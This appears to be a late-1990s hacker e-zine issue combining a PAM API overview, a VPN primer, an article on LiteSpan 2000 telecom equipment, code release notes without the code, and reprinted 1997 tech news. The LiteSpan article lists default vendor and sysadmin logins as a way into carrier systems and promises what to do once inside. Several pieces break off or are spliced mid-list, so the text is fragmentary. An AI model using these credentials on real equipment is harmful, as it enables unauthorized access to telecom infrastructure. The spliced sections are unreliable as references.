 : VI. How It Works             ³
 ú-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

 The core components of the PAM framework are the authentication library API
 front end and the authentication mechanism-specific modules back end,
 connected through the Service Provider Interface. Applications write to the
 PAM API, while the authentication-system providers write to the PAM SPI and
 supply the back end modules that are independent of the application.

				    Basic PAM Architecture

 The figure above illustrates the relationship between the application, the
 PAM library, and the authentication modules.  Three application (login,
 telnet and ftp) are shown which use the PAM authentication interfaces. When
 an application makes a call to the PAM API, it loads the appropriate
 authentication module as determined by the configuration file, /etc/pam.d/,
 unless this is not found, then pam.conf is used. The request is forwarded to
 the underlying authentication module (for example, UNIX password, Kerberos,
 etc.) to perform the specified operation. The PAM layer then returns the
 response from the authentication module to the application.

 PAM unifies system authentication and access control for the system, and
 allows plugging of associated authentication modules through well defined
 interfaces.  The plugging can be defined through various means, one of which
 uses a configuration file, as shown in Section IV. Each of the system
 applications, the file specifies the authentication module that should be
 loaded.

 : VII. The PAM API             ³
 ú-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

 The following should give you an basic description of the various interfaces
 of PAM.  Since the goal here is just for you to get a working knowledge about
 the PAM interfaces, not all flags and options have been fully defined and
 explained.

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 Framework Layer APIs
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		  int
		  pam_start(
			 char *service_name,
			 char *user,
			 struct pam_conv *pam_conversation,
			 pam_handle_t **pamh
		  );

 pam_start() is called to initiate an authentication transaction. pam_start()
 takes as arguments the name of the service, the name of the user to be
 authenticated, the address of the conversation structure.  pamh is later used
 as a handle for subsequent calls to the PAM library.

 The PAM modules do not communicate directly with the user; instead they rely
 on the application to perform all such interaction.  The application needs to
 provide the conversation functions, conv(), and associated application data
 pointers through a pam_conv structure when it initiates an authentication
 transaction.  The module uses the conv() function to prompt the user for
 data, display error messages, or text information.

		  int
		  pam_end(
			 pam_handle_t *pamh,
			 int pam_status
		  );

 pam_end() is called to terminate the PAM transaction as specified by pamh,
 and to free any storage area allocated by the PAM modules with
 pam_set_item().

		  int
		  pam_set_item(
			 pam_handle_t *pamh,
			 int item_type,
			 void *item
		  );

		  int
		  pam_get_item(
			 pam_handle_t *pamh,
			 int item_type,
			 void **item);

 pam_get_item() and pam_set_item() allow the parameters specified in the
 initial call to pam_start() to be read and updated.  This is useful when a
 particular parameter is not available when pam_start() is called or must be
 modified after the initial call to pam_start().  pam_set_item() is passed a
 pointer to the object, item, and its type, item_type.  pam_get_item() is
 passed the address of the pointer, item, which is assigned the address of
 the requested object.

	 The item_type will be one of the following:

		  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
 Note: that the values of PAM_AUTHTOK and PAM_OLDAUTHTOK are only available to
 PAM modules and not to the applications.  They are explicitly cleared out by
 the framework before returning to the application.

		  char *
		  pam_strerror(
			 int errnum
		  );

 pam_strerror() maps the error number to a PAM error message string, and
 returns a pointer to that string.

		  int
		  pam_set_data(
			 pam_handle_t *pamh,
			 char *module_data_name,
			 char *data,
			 (*cleanup)(pam_handle_t *pamh, char *data,
					  int error_status)
		  );

 The pam_set_data() function stores module specific data within the PAM
 handle.  The module_data_name uniquely specifies the name to which some data
 and cleanup callback function can be attached.  The cleanup function is
 called when pam_end() is invoked.

		  int
		  pam_get_data(
			 pam_handle_t *pamh,
			 char *module_data_name,
			 void **datap
		  );

 The pam_get_data() function obtains module-specific data from the PAM handle
 stored previously by the pam_get_data() function.  The module_data_name
 uniquely specifies the name for which data has to be obtained.  This function
 is normally used to retrieve module specific state information.

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 Authentication APIs
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		  int
		  pam_authenticate(
			 pam_handle_t *pamh,
			 int flags
		  );

 The pam_authenticate() function is called to verify the identity of the
 current user.  The user is usually required to enter a password or similar
 authentication token, depending upon the authentication module configured
 with the system.  The user in question is specified by a prior call to
 pam_start(), and is referenced by the authentication handle, pamh.

		  int
		  pam_setcred(
			 pam_handle_t *pamh,
			 int flags
		  );

 The pam_setcred() function is called to set the credentials of the current
 process associated with the authentication handle, pamh. The actions that can
 be denoted through flags include credential initialization, refresh,
 reinitialization and deletion.

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 Password Management APIs
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		  int
		  pam_chauthtok(
			 pam_handle_t *pamh,
			 int flags
		  );

 pam_chauthtok() is called to change the authentication token associated with
 the user referenced by the authentication handle pamh.  After the call, the
 authentication token of the user will be changed in accordance with the
 authentication module configured on the system.

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 Session Management APIs
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		  int
		  pam_open_session(
			 pam_handle_t *pamh,
			 int flags
		  );

 pam_open_session() is called to inform the session modules that a new session
 has been initialized.  All programs which use PAM should invoke
 pam_open_session() when beginning a new session.

		  int
		  pam_close_session(
			 pam_handle_t *pamh,
			 int flags
		  );

 Upon termination of this session, the pam_close_session() function should be
 invoked to inform the underlying modules that the session has terminated.

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 Account Management API
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		  int
		  pam_acct_mgmt(
			 pam_handle_t *pamh,
			 int flags
		  );

 The function pam_acct_mgmt() is called to determine whether the current
 user's account and password are valid.  This typically includes checking for
 password and account expiration, valid login times, etc.  The user in
 question is specified by a prior call to pam_start() and is referenced by the
 authentication handle, pamh.

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
 The PAM Service Provider Interface:
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

	 This is very similar to the PAM API, except for one extra parameter to
	 pass module-specific options to theunderlying modules.

VPN's Demystified
by Meikon, Special to thtj


	VPN's short for Virtual Private Networks are secure networks
that implement encryption to communicate between two users. It allows
private communication over virtual WANs or LANs. The VPN can also 
be implemented in X.25 networks. VPN's also provide secure data
transmission with Tunneling Protocol through the Internet. 
With standard networks, a sniffer can easily overcome security.
In a VPN , there are thre eimplementations used.

1. Encryption - use of algorithm to encrypt and decrypt data transfer.
2. Authentication - confirmation of users identity on the network (use
public key authentication to confirm users connection) also sometimes
use of login and password , which is vunerable to crackers.
3. Data Integrity - hash used , differnet hashes used : Message
Digest (MD5) , Secure Hash Algorithm1 (SHA-1). The MD5 Hash generates
128-bit keys. The SHA-1 Hash generates 160-bit keys.

LiteSpan 2000
by XiLiCoN, Special to thtj

	A Litespan 2000 unit is a Synchronous Optical Network (SONET) based
	   Optical Loop Carrier (OLC) system. It provides 4 system functions.
	   Those systems are as follows:

DLC) Digital Loop Carrier: Provides 2,016 DS0s of bandwidth for delivery of
	services such as data, coin, or dial tone.

DCS) Digital Cross Connect System: Takes apart DS1 signals into DS0,
	rearranges them and puts them back into DS1 signals. This is know as
	1-0-1 cross-connect.

SONET) Fiber transport system: Uses lightwave technology and SONET protocol to
	  transport signals between lightspan terminals.

MUX) Mulitplexer: Takes multiple low speed signals(DS0s, DS1s) and interleaves
	them to form a single high speed data stream at SONET bit rates.

 _,.-~-.,_,.-~-.,_,.-~-.,_,.-~-.,_,.-~-.,__,.-System Security-.,_,.-~-.,_,.-~-.,,.-~-.,_,.-~-.,_,.-~-.,_,.-~-.,_

	The Litespan provides two levels of security to maintain system
	   integrity. These security levels controls who can access the system
	   and what the authorized user is allowed to do in the system.

- Each authorized user is assigned a set of privileges that determine the
  actions allowed to the user.

- The Litespan maintains an internal list of authorized user IDs, passwords,
  and user privileges.

- There are up to 20 users possible.

	Now to access security.you will be prompted for a User Id and a
	   Password at a terminal that looks much like this:

OMAPS Log In
OMAPS V05.01.05 Copyright 1997 Optlink Corp. All Rights Reserved

User Id:
Password:

	Now for the ball busting part. If you repeat the login procedure
	   incorrectly 5 times you will be locked out of the system. Also the
	   user id's can be up to 20 character, number or letter with both upper
	   and lower case. Same with the password. The litespan has a sysadmin
	   like in a unix system, but the litespan admin usually has a long
	   beard and a smug expression. But it is possible that a dumb sysadmin
	   will leave in the default logins/passwords. Those are as follows:

User Id: optlink
Password: optlink

and..

User Id: sysadmin
Password: sysadmin

	Well that gives you a look at System Security from the outside, Look
	   at part 3 if you were able to get in. It gives a run down on User
	   Privileges.

	   User Privleges. Well user privileges are important, the sysadmin
	   maintains a file in the system that gives different users different
	   privileges. The user privileges file will be setup somewhat like this:


User Id    Password   CP  M  M0  M1  N  NR  P  PR  P0  P1  S  T

User1       *****      x                  x         x       x                     x        x

User2       *****      x                  x         x            x                x        x


	That is a basic layout. The CP, M, M0 ect. are privileges. The X's
	   are basically checks allowing a certain user to perform a certain act
	   in the system. The Different Privileges are as follows:

CP = Allows someone to change the user id, password or privileges of any user
	on the system. This is one of the sysadmins privileges for the most part.
	
M0 = Maintenance privlege (DS0 only)

M1 = Maintenance privlege (DS1 only)

MR = Maintenace READ ONLY privlege

N = Network Administrative privlege; Allows backup and restore of database

realesed on Tue Oct 21 18:55:02 199 v0.001
well , i'll comment the code , if u want to improve it,
no matters if u want to improve it.. :)

way u could do to improve it:

	-make structurs type file to stock words got and
	 wont write exactly the 2 same words in the outpout file

	-make a third argument as a integer type (with atoi)
	to put a word size to save.. instance: dont save the words
	in the outpout file if they have less than 3 caracters

 Spammers beware: Usenet2 not for you    
 Network World, September 22, 1997 
 
 A new, spam-free version of the Internet-based bulletin board system Usenet 
 is being developed. Called Usenet2 or U2, the network will use monitoring 
 software and a strict set of community rules to create a spam-free 
 environment. Spam refers to unwanted mass postings to Usenet discussion 
 groups. According to some estimates, 80% of the messages now posted on 
 Usenet are spam or spam "cancels," which are messages that try to delete 
 spam from servers. Several Internet service providers have agreed to support 
 Usenet2, including ZippoDot Com and PANIX. Usenet2 will use monitoring 
 software called Net-Monitor which can filter out binary posts and any post 
 that is being sent to more than 3 newsgroups. Systems that agree to carry 
 Usenet2 must also obey a strict set of rules including real return e-mail 
 addresses on postings. If a system breaks the rules, it can have its Usenet2 
 feed disconnected.

 S/MIME Cracked by a Screensaver
 by Simson Garfinkel 

 26.Sep.97.PDT -- Cracking encrypted email just got much easier - as long as 
 the message was encrypted with Netscape Navigator or Microsoft's Outlook 
 Express. 

Bruce Schneier, a cryptography consultant based in Minnesota, has created a 
Windows 95 screensaver that cracks encrypted email messages on computers that 
are otherwise unused. "On average, it takes 35 days on a 166 MHz Pentium," 
said Schneier, who is also the author of the book Applied Cryptography. 

The real power of Schneier's program is that it's designed to work on 
multiple machines in parallel over a local-area network. Got an office with a 
dozen machines? You can crack a message in a little less than three days. Got 
a thousand? Your wait will be just 50 minutes. The program, which began as a 
screensaver that searched for large prime numbers, will be made available on 
Schneier's Web site today. 

The program will only crack messages encrypted with RSA Data Security's 
S/MIME mail encryption standard, and at that, only messages that are 
encrypted with a 40-bit key. But that's exactly the encryption that's being 
offered today by the most commonly used versions of Netscape Messenger and 
Microsoft Outlook Express. 

"What really pisses me off is that [these products] are being marketed as 
secure," said Schneier. "The products don't say that they use 40-bit 
encryption - be careful. They say this is security." 

The S/MIME standard implemented by Netscape and Microsoft does provide for 
higher-level security by using different encryption algorithms. But Schneier 
maintains that messages encrypted with these stronger algorithms cannot be 
exchanged between the two vendors' products. "The S/MIME security standard is 
really hard to work with," said Schneier. "None of [the products] 
interoperate at any level other than 40-bit RC2." 

Schneier says he's releasing his program to demonstrate the fundamental 
vulnerabilities in the S/MIME standard. But S/MIME's maker disagrees, saying 
there is no problem using longer keys. 

"Bruce is mistaken," said Scott Schnell, vice president of marketing for RSA 
Data Security, the co-author of the S/MIME specification. "We have mail 
messages on file in our interoperability test lab which demonstrate 
interpretability between Outlook Express and Netscape's Messenger using 
triple-DES," which has a 168-bit key.

 Webmaster Lets Sites Hack Themselves
 by Mike Tanner 

 25.Sep.97.PDT -- When A.H.S. Boy secured the domain graphics.com this month 
 for a nonprofit Web resource for graphic designers he was building, it 
 seemed like a real coup for his nascent site. That is, until the address 
 started logging thousands of hits while it still consisted merely of an 
 "under construction" marker page. It soon became apparent that the flood of 
 links was caused by a browser quirk that caused certain kinds of badly-coded 
 graphics URLs to link to his domain. Boy seized upon the serendipitous 
 glitch as an opportunity to passively hack those sites that erroneously 
 linked to his, loading them with banners featuring subversive slogans. 

For the past several weeks, therefore, unwary visitors to sites, including 
those for such corporate and political powers as Packard Bell, Corel, and the 
government of Hong Kong, have been confronted with graphics telling them, 
"You are only a resource for profit" or, "Revolution is the most beautiful 
word." 

"Of course returning these very subversive graphics that some of these sites 
are getting, probably won't make the owners of these sites very happy," says 
Boy, who runs sites for a situationist organization, an Austrian arts group, 
a bookstore, and his own shareware business off the same server. To show 
there's no ill-will intended, however, he puts the URL to his site on all the 
banners, and offers a page explaining how to fix the broken links. 

Since many webmasters put their graphics files in a folder labeled 
"graphics," the "hack" takes advantage of intelligent browsers' default 
tendency to interpret "graphics" in badly-coded links as "www.graphics.com." 
The problem is exacerbated when visitors to a site mistype its URL with a 
question mark instead of a slash. Boy says that almost half of his server's 
current traffic of 1,500 daily hits are from these errors. 

When this plethora of hits began showing up on his site, Boy simply adapted a 
randomized error-page system he had designed for avoiding static 404 messages 
on his own site. Now when graphics.com gets a graphics request, a CGI script 
randomly serves up one of 11 slogans. 

Netscape spokesman Christopher Hoover says this is the first time his company 
has heard of this kind of problem associated with their browser's ability 
"for resolving these kinds of conflicts" by adding .com to links - a feature 
which generally provides a useful coding shortcut. He says it's a quirk 
that's due to the near ubiquity of "graphics" as the name for the folder 
holding a Web site's art files, and that there's unlikely to be another 
domain name of similar vulnerability. 

Despite Boy's efforts to help sites remedy the underlying code problems, his 
prank has provoked a number of mystified and angry messages from surfers and 
site administrators. One "irate webmaster" from a computer reseller's site 
even threatened to alert the FBI's computer security division, but so far no 
legal actions have been taken. And Boy isn't particularly worried that they 
will be, since he never touches anybody else's site. "Their servers are 
hacking mine," he says. "I'm just controlling it."

 High-Tech Burglar Alarms Expose Intruders 
 09/18/97
 By Rutrell Yasin, InternetWeek  

 If you're not thinking about installing "burglar alarms" on your network, 
 chances are you will soon.

An emerging class of high-tech intrusion detection systems -- also known as 
burglar alarms -- promises to alert IT administrators when their network 
security is breached by unauthorized intruders.

Security companies such as Axent Technologies, Internet Security Systems, 
Intrusion Detection, and the WheelGroup are shipping tools that give 
corporations a layer of defense that goes beyond the firewall. Network 
General earlier this month became the first networking vendor to enter the 
fray with CyberCop, a tool that monitors networks for external and internal 
attacks.

"Firewalls are very important. They can be very effective, but they can't do 
everything. They can be circumvented," said Richard Power, director of 
research and publications at the Computer Security Institute, in San 
Francisco.

Firewalls protect gateways to the network, but in today's complex Web of 
private networks, intranets and extranets, the Internet is not the only 
entrance to the network, Powers said.

Firewalls are usually placed in front of Internet access links, wide-area 
links, and dial-in servers to monitor the protocols and services that flow in 
and out of a network. But they cannot tell when security has been breached, 
and they tend to slow network performance when they are deployed in internal 
networks.

Working In Perfect Harmony

Intrusion-detection systems complement firewalls by monitoring the network 
and performing real-time capture and analysis of packet headers and content 
data. 

Using sophisticated algorithms to recognize attacks, intrusion-detection 
systems can send alerts to administrators to warn them of possible break-ins. 
Some products can even stop intruders from breaking into the network.

In the past, intrusion detection was a very labor-intensive, manual task, 
said Jude O'Reilley, a research analyst at Gartner Group's network division, 
in Stamford, Conn. "However, there's been a leap in sophistication over the 
past 18 months," and a wider range of automated tools is hitting the market, 
he said.

Network General's intrusion-detection system draws on the company's 
experience in delivering packet-level analysis systems -- such as the popular 
Sniffer analyzer -- to provide a network-based security system, according to 
Katherine Stolz, product manager for Internet security systems at Network 
General, in Menlo Park, Calif.

CyberCop uses algorithms from the San Antonio-based WheelGroup and consists 
of sensors, a management server, and a Java-compliant browser. Sensors 
capture data packets and analyze them for suspicious behavior. Data packets 
are saved in an "Evidence Trace File" to record attackers' footprints as they 
move around the network.

Sensors pass off events to the management server, which sends alarms via 
E-mail, pager, or SNMP traps, alerting security administrators to take 
action. CyberCop's closest competitor is Internet Security Systems' 
RealSecure software, which includes an attack recognition engine that ferrets 
out suspicious behavior. "The trickiest part is understanding attacks," said 
Patrick Taylor, vice president of marketing at Atlanta-based ISS.

 RealSecure -- which has received good reviews for the breadth and range of 
 attacks it can discover -- brings a more server-based approach to intrusion 
 detection. "Depending on the network topology, having a box on a network 
 segment doesn't work for everyone. Some users need to monitor the activity 
 of servers," Taylor said.

ISS' strategy is to sell its technology to other vendors. During the next six 
to 12 months, RealSecure will be embedded in many of the leading firewalls, 
switches, and servers, he said.

Not The End-All

Intrusion-detection systems hold a great deal of promise for security 
administrators, but like firewalls, they do not solve all security problems, 
CSI's Powers cautioned. At this stage, "intrusion-detection systems detect 
only what they know to look for," he said. In the future, vendors will offer 
tools with expert systems capabilities that can detect suspicious behavior, 
he said.

Intrusion-detection tools are aimed at vertical markets such as financial, 
telecommunications, government, and military organizations.

To be successful in the mainstream market, the tools will have to be 
inexpensive, easy to use, and able to support intranet applications and 
popular workstation platforms such as Windows NT, Gartner's O'Reilley said.

Firewall vendors -- which are now offering aggressively priced, plug-and-play 
systems -- can serve as a good model for aspiring intrusion-detection 
vendors, O'Reilley said. Intrusion-detection tools can cost anywhere from 
$40,000 to $50,000, but prices are likely to drop during the next 18 months, 
he said.

 WorldCom Bid Threatens BT-MCI Merger 
 By Douglas Hayward, TechWire          
 
 LONDON -- MCI's mega merger with British Telecom could be abandoned, 
 following a counterbid for the U.S. long distance carrier by WorldCom. 

The aggressive and acquisitive WorldCom offered MCI shareholders $41.50 a 
share Wednesday morning, more than the equivalent of $34 a share BT proposes 
to pay. The bid values MCI at $30 billion -- 41 percent more than the 
company's $21 billion price tag at close of markets Tuesday, WorldCom said in 
a statement Wednesday.

The combined group, which would be 25 percent owned by MCI's current 
shareholders, would have revenues of some $30 billion, WorldCom added. 

BT shares were up 9 percent at midday Wednesday on news of the bid, which 
could net BT a healthy profit on its 20 percent stake in MCI. BT had no 
comment to make on the bid early Wednesday afternoon.

WorldCom has acquired 40 companies in the past five years, including Internet 
carrier MFS. Acquiring MCI will boost the combined group's earnings by up to 
22 percent and cut its costs by $2.5 billion in the first year after the deal 
closes, WorldCom said.

WorldCom chief executive Bernard Ebbers attempted to boost his company's 
chances by saying that joining WorldCom made better business sense for MCI 
than being snatched up by BT. The deal would result in savings for the 
combined group of roughly $5 billion in the fifth year of the new group's 
existence, he added. 

"While MCI and British Telecom are both great companies, the fit between them 
just doesn't work without sufficient local network assets in place," said 
Ebbers in a letter to MCI chairman Bert Roberts. Because WorldCom has those 
assets in place, far greater synergies than BT can offer are possible, he 
said. "It is clearly a superior fit and, as a result, a superior offer," 
Ebbers said.

WorldCom is trying to exploit the fact that BT was recently forced to lower 
its bid for MCI, after the American carrier disclosed it was losing more 
money than it had previously thought in its attempt to break into the local 
phone market in North America.

Ebbers also appealed to MCI's sense of patriotism. "Our two companies are the 
paradigm for the American entrepreneurial spirit," he said. "We have both 
forged significant in roads into industries long dominated by giants, and 
have been among the first to offer consumers a choice of providers for local, 
long distance, data, and other services."

Although BT shares rose dramatically Wednesday morning, the euphoria in 
London could be short-lived. If the bid succeeds, it could destroy BT's 
international strategy, which is heavily dependent on its alliance with MCI, 
particularly in Latin America. 

Concert, the international joint venture of BT and MCI, has secured several 
major customer contracts and alliances with leading telephone operators 
including Telefonica de Espana and Portugal Telecom. Those contracts are at 
risk if the WorldCom bid succeeds.

 U.S. cell phone industry battles service thieves    
 October 1, 1997
 By Brad Liston

 ORLANDO, Fla. (Reuter) - Thousands of cellular telephone users have had the 
 unfortunate experience of opening their monthly bills and finding hundreds 
 of dollars in charges for calls they did not make.

The good news for them is that such fraud is way down, according to delegates 
to a conference of the U.S. wireless telephone industry Wednesday.

But the bad news is that wireless thieves are getting more sophisticated.

"The criminal customer will never go away," warned Roseanna DeMaria, vice 
president for business security at AT&T Corp. Wireless Services. "He'll just 
engage in some very creative R&D."

At the Cellular Telecommunications Industry Association's Fraud '97 
conference, industry leaders said the theft of wireless services in 1996 had 
dropped to 3 percent of annual revenues.

In the early 1990s, that number was 6 percent.

There currently are about 50 million wireless customers in the United States.

Before 1995, stealing a cell phone signal was a simple as standing outside a 
shopping mall in an area with heavy cellular traffic and picking up a signal 
that could be reprogrammed into another phone to make it look as if its calls 
were coming from a legitimate account.

New technologies are making that more difficult, said Thomas McClure, the 
association's director of fraud managment.

For example, wireless service providers can now match an electronic serial 
number unique to a digital wireless phone with another identification number 
unique to each account in a system similar to the military's "friend and foe" 
technology. If someone uses an account on an unauthorized phone, he trips a 
computer that alerts the service provider.

Thanks to that technology, called radio frequency fingerprinting, cellular 
thieves who could once promise service for 30 days before phone companies 
caught on now can promise only about three days.

For older analog phones, the industry is becoming more adept at spotting 
changes in customer patterns. "If your account suddenly shows, say, three 
calls a day to Bangladesh, then a computer will recognize that, and someone 
will contact you to confirm the calls," McClure said.

Law enforcement sources say the ranks of cellular thieves include the usual 
suspects -- drug smugglers, organized crime figures and criminal fugitives, 
among others.

"The professional criminal is clearly going after our service," McClure said. 
"He wants to become the invisible man."

So where do criminals, whose expertise may lie more along the line of cutting 
cocaine or breaking thumbs, find people sharp enough to steal cutting-edge 
technology?

"They recruit it," Jeff Nelson, spokesman for the Cellular Telecommunications 
Industry Association, said. "We're up against some of the best minds in the 
nation."

 Junk Mail Giant Cyber Promotions Is Back Online 
 By Bill Pietrucha
 
 WASHINGTON, DC, U.S.A., 1997 OCT 3 (NB) -- Cyber Promotions Inc., the online 
 junk mail giant, has been reconnected to Internet service provider Apex 
 Global Internet Services (AGIS). 

"We just went back up in the past hour," a Cyber Promotions spokesperson told 
Newsbytes. "We're not fully functional yet, but we are back online." 

Earlier today, Cyber Promotion still was not reconnected to AGIS, despite a 
ruling last Tuesday that AGIS must reconnect Cyber Promotions until October 
16. Earlier this week, Cyber Promotions also posted a $12,500 bond ordered by 
Judge Anita Brody of the US District Court in Philadelphia to pay for any 
possible damage to AGIS' network caused by "anti-spam" spam attacks against 
both Cyber Promotions and AGIS for providing service to Cyber Promotions. 

This past Tuesday, Judge Brody granted Dresher, Pennsylvania- based Cyber 
Promotions a temporary preliminary injunction, forcing AGIS to reconnect the 
bulk e-mail provider to their service. Brody's ruling said that the contract 
between AGIS and Cyber Promotions requires AGIS to issue a 30 day notice 
before terminating service. 

"We obviously are not pleased with the court's ruling," AGIS CEO Phillip 
Lawlor said after the ruling. "We are not happy with the court's decision, 
but we must abide by it." 

Lawlor, who said he regretted ever taking Cyber Promotions on as a client, 
said Cyber Promotions told the court it is looking for other Internet Service 
Providers to handle the junk mail account. 

Lawlor also left the door open for Cyber Promotions, saying AGIS "is looking 
at all options" regarding October 17, the date AGIS can again disconnect 
Cyber Promotions. 

"We'll decide between now and that time what is the best course of action to 
take," Lawlor said. 

AGIS counsel Philip Katauskas, however, said, "our actions to date say we 
don't want them on our network." 

In late September, the Dearborn, Michigan-based AGIS, the nation's fourth 
largest carrier of Internet traffic, disconnected several unsolicited, bulk 
e-mailers, including Cyber Promotions Inc., "for security reasons." 

"The attacks were of a nature which not only threatened portions of our 
global, public network, but other parts of the Internet as well," Lawlor 
said. "Our engineers simply followed AGIS standard security procedures in 
shutting their service down." 

Reacting to the shut-off of service, Cyber Promotions filed suit against AGIS 
in US District Court in Philadelphia for allegedly breaking its distribution 
contract. US District Court Judge Brody, citing the breach of contract by 
AGIS for shutting down Cyber Promotions' connection without warning, said in 
her ruling that "the fact that Cyber is an unpopular citizen of the Internet 
does not mean that Cyber is not entitled to have its contracts enforced in a 
court of law or that Cyber is not entitled to such injunctive relief as any 
similarly situated business."

Electric Outlets Could Be Link To the Internet 
By Gautam Naik  
The Wall Street Journal  
10/07/97 

LONDON -- Engineers claim to have developed a breakthrough technology that 
would let homeowners make phone calls and access the Internet at high speeds 
via the electric outlets in their walls. 

If the technology developed by United Utilities PLC and Northern Telecom Ltd. 
proves commercially viable, it could transform power lines around the world 
into major conduits on the information superhighway. Because electricity 
flows into virtually every home and office the new technology could give 
power companies easy entree into the phone and Internet access businesses, 
thus posing a serious threat to current providers of those services. 

Both United Utilities, a power company, and Northern Telecom, a Canadian 
maker of telecom gear, confirmed that their system was "ready for the mass 
market," but declined to reveal details until a news conference scheduled for 
tomorrow. A Northern Telecom spokesman also declined to elaborate. 

While the technology must still be proven on a large scale, the two companies 
have tested telephone service over power lines in about 20 U.K. households 
over the last 12 months -- with positive results, according to Alistair 
Henderson, chief of technology at Energis PLC, the telecom unit of National 
Grid Group PLC, which owns and operates the electricity-transmission system 
in England and Wales. Energis, one of several power companies that has 
secretly worked with United Utilities on the "power line telephony" project, 
hopes to use the system to offer data services to its own business customers. 

"It's very good news for utilities, indeed," says Mr. Henderson. "Everybody 
has an electricity line to their homes, and every business has electric 
supply. "At long last, the local monopoly of the incumbent telecom operators 
is about to be demolished." 

But some questions remain. Although United Utilities' initial tests have been 
successful, technical and safety wrinkles have to be ironed out. There's also 
likely to be intensifying competition from a host of other wanna-be phone and 
Internet service providers, including cable companies and outfits that use 
wireless technology to provide high-speed access. And for the new system to 
be commercially feasible, a power utility would have to sign up 40% or more 
of homes and offices in a particular neighborhood, Mr. Henderson says. 

This could prove a difficult task as existing telecommunications players have 
proven to be adept at making life hard for new entrants. The Baby Bells in 
the U.S., for example, have largely thwarted efforts by AT&T Corp. and MCI 
Communications Corp. to enter the local telephone business. 

In recent years electric utilities in the U.S. and Europe have been trying to 
enter the telecom fray by the more conventional method of stringing 
fiber-optic cables along power lines. But so far they've had limited success. 
As a result, utilities have waited for exactly this kind of breakthrough to 
make a big splash in the telecom wars. 

While electric lines have been used before to zap tiny amounts of data 
between computers, their capacity has always been limited, making commercial 
applications unfeasible. Now United Utilities' telecom arm, Norweb 
Communications, has found a way to transmit data at a speed of more than 384 
kilobits per second over regular electricity lines -- more than 10 times the 
speed of Internet modems used by most households with regular telephone 
lines. 

The advantage of the latest system -- which uses cellular phone technology to 
transmit signals along electric wires -- is that utilities needn't spend vast 
amounts of to build new telecom infrastructure, since existing power lines 
can simultaneously transmit both electricity, and a phone call, say. 
Electricity doesn't interfere with the phone transmission for the same reason 
that a radio broadcast doesn't interfere with a simultaneous TV broadcast: 
the frequencies are very different. "Utilities won't have to touch the wires 
underground," notes Mr. Henderson. 

Of course, there will be some cost to utilities that want to commercialize 
the new technology and enter the telecom business. Utilities will have to 
install a device in each residence or office to separate the electricity and 
phone transmissions. From the device, one line will deliver the telephone and 
Internet link, while the other will deliver electricity. In the case of the 
two companies' test, Northern Telecom is believed to have built the box that
separates the power and data transmissions.

Coming Soon: Net Access Through Power Lines
October 8, 1997
By Reuters

"Canada's Northern Telecom (Nortel) and Britain's Norweb Communications today 
unveiled new technology allowing reliable, low-cost, high-speed access to the 
Internet through the domestic electricity supply. 

In a move heralding the first competition between electricity companies and 
telecommunications carriers, the two groups said their patented technology 
would allow power firms to convert their infrastructures into information 
access networks. 

Having reduced electrical interference on power lines, the companies said 
they could shunt data -- and possibly voice -- over power lines into the home 
at up to 1MB per second.

This is up to ten times faster than ISDN, the fastest currently available 
speed for domestic computer users. Although it is slower than rival ADSL 
technology being developed by British Telecommunications, which upgrades 
copper wires, Norweb and Nortel's technology is much cheaper for operators to 
install. 

All consumers need is the equipment developed by Nortel and Norweb -- an 
extra card for personal computers, some software to handle subscription, 
security, and authentication services, and a small box that is installed next 
to the electricity meter.

This will send and receive data and is in turn linked to a personal computer 
through an ordinary coaxial cable. Peter Dudley, vice president of Nortel, 
said the groups had an "absolutely spectacular" amount of interest from 
electricity companies in Britain and abroad that are keen to offer the 
service to consumers.

"The race is on to be first," he told Reuters.  Prices will be set by 
electricity companies that offer the service. But consumers currently spend 
an average of 20 to 30 pounds ($48.60) per month for Internet access -- and 
the new service offers permanent access without telephone costs.

"Assuming they continue to spend at that rate, it is not unreasonable to 
assume that is the kind of tariffing that may be submitted," Dudley said.

The Canadian telecoms equipment maker, and Norweb, part of England's 
multiutility United Utilities, said their technology was fast enough for most 
future domestic or small office applications and was cost effective enough to 
allow operators returns on investments.  "As one of the first practical, low 
cost answers to the problem of high speed access to the Internet, this 
technology will unleash the next wave of growth," Dudley said.

The two companies have developed a "specialized signaling scheme" that allows 
them to carry data traffic between local power substations and homes, 
effectively turning the electricity supply into a communications network. 
Each substation is then linked by fiber-optic circuits to a central switch -- 
and from there into the worldwide computer network.

After 18 months of refining and upgrading a prototype and promising "oodles 
of bandwidth," the companies said they planned to market the technology in 
Europe and the Asia Pacific region. "We are ready to ship in volume," said 
Ian Vance, vice president and chief scientist at Nortel Europe. 

Banking on high growth and good economic returns, Norweb hopes to attract 
around 200 customers in a marketing pilot in northwestern England in the 
second quarter of 1998 before rolling out the service."

 GTE Makes $28B Cash Offer For MCI 
 By Kora McNaughton, TechInvestor 

 GTE made a $28 billion, all-cash bid Wednesday to acquire MCI, bringing to 
 three the number of suitors pursuing the long-distance carrier. 

The latest offer, which values MCI stock at $40 a share, follows WorldCom's 
$30 billion bid, made two weeks ago. The proposed stock deal from Jackson, 
